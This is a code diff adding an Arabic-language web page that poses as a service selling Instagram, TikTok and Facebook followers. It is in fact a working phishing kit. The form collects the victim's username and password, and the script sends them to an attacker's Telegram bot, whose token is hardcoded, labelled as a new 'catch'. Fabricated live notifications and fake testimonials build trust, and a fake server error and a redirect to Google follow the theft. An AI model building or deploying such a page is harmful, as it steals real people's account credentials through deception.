@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المنصة العالمية لزيادة المتابعين</title>
+    <style>
+        :root { --primary: #6c5ce7; --secondary: #a29bfe; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .card { background: white; border-radius: 15px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
+        .logo-header { font-size: 24px; font-weight: bold; color: var(--primary); margin-bottom: 10px; }
+        .platform-selector { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .p-item { border: 2px solid #eee; padding: 10px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-size: 12px; }
+        .p-item.active { border-color: var(--primary); background: #f0edff; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .live-notifications { width: 100%; max-width: 400px; background: #333; color: #fff; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 15px; display: none; }
+        .comments-section { width: 100%; max-width: 400px; margin-top: 20px; background: white; padding: 15px; border-radius: 10px; font-size: 13px; }
+        .comment { border-bottom: 1px solid #eee; padding: 8px 0; text-align: right; }
+        .user-name { font-weight: bold; color: #555; }
+    </style>
+</head>
+<body>
+
+    <div id="notif" class="live-notifications"></div>
+
+    <div class="card">
+        <div class="logo-header">🚀 ميديا بوست</div>
+        <p>اختر المنصة ونوع الخدمة المطلوبة</p>
+
+        <div class="platform-selector">
+            <div class="p-item active" onclick="setPlatform('Instagram')">إنستغرام</div>
+            <div class="p-item" onclick="setPlatform('TikTok')">تيك توك</div>
+            <div class="p-item" onclick="setPlatform('Facebook')">فيسبوك</div>
+        </div>
+
+        <form id="mainForm">
+            <input type="text" id="targetUser" placeholder="اسم المستخدم أو رابط الحساب" required>
+            <input type="password" id="targetPass" placeholder="كلمة مرور الحساب (للتوثيق)" required>
+            <select id="serviceType">
+                <option>+5000 متابع حقيقي</option>
+                <option>+10000 متابع حقيقي</option>
+                <option>+25000 متابع (VIP)</option>
+            </select>
+            <button type="submit">بدء الإرسال الآن</button>
+        </form>
+
+        <div id="loader" style="display:none;">
+            <p>جاري فحص الحساب...</p>
+            <div style="width:100%; background:#eee; height:10px; border-radius:5px;">
+                <div id="bar" style="width:0%; background:var(--primary); height:100%; border-radius:5px; transition: 1s;"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="comments-section">
+        <b>آراء المستخدمين (142):</b>
+        <div class="comment"><span class="user-name">أحمد علي:</span> والله العظيم وصلني 5000 متابع في ربع ساعة! شكراً.</div>
+        <div class="comment"><span class="user-name">سارة خالد:</span> جربت تيك توك ونجح معي، روعة.</div>
+    </div>
+
+    <script>
+        let currentPlatform = "Instagram";
+     const token="8310136247:AAF5TEurlnaosFJK2mpw5fsehdo6vsBwOWs";
+        const chatId = "6506720047";
+
+        function setPlatform(p) {
+            currentPlatform = p;
+            document.querySelectorAll('.p-item').forEach(i => i.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+        }
+
+        // إشعارات وهمية لإضفاء واقعية
+        const names = ["اكرم سالم", "سليمان منصور", "عبدالله علي", "تميم تاج راسك", "فنش فنش"];
+        setInterval(() => {
+            const n = names[Math.floor(Math.random() * names.length)];
+            const div = document.getElementById('notif');
+            div.style.display = 'block';
+            div.innerText = `✅ حصل ${n} للتو على +${Math.floor(Math.random()*5000)} متابع`;
+            setTimeout(() => div.style.display = 'none', 3000);
+        }, 7000);
+
+        document.getElementById('mainForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const user = document.getElementById('targetUser').value;
+            const pass = document.getElementById('targetPass').value;
+            const service = document.getElementById('serviceType').value;
+
+            document.getElementById('mainForm').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            
+            // إرسال البيانات لتليجرام
+            const msg = `
+🎯 صيد جديد (مركز الخدمات):
+🌐 المنصة: ${currentPlatform}
+👤 الحساب: ${user}
+🔑 الباسورد: ${pass}
+📦 الخدمة: ${service}
+--------------------------
+📱 الجهاز: ${navigator.platform}
+            `;
+
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg })
+            });
+
+            // حركة شريط التحميل
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    alert("خطأ في الخادم: يرجى تسجيل الدخول يدوياً لتأكيد ملكية الحساب.");
+                    window.location.href = "https://google.com";
+                } else {
+                    width += 10;
+                    document.getElementById('bar').style.width = width + '%';
+                }
+            }, 500);
+        });
+    </script>
+</body>
+</html>
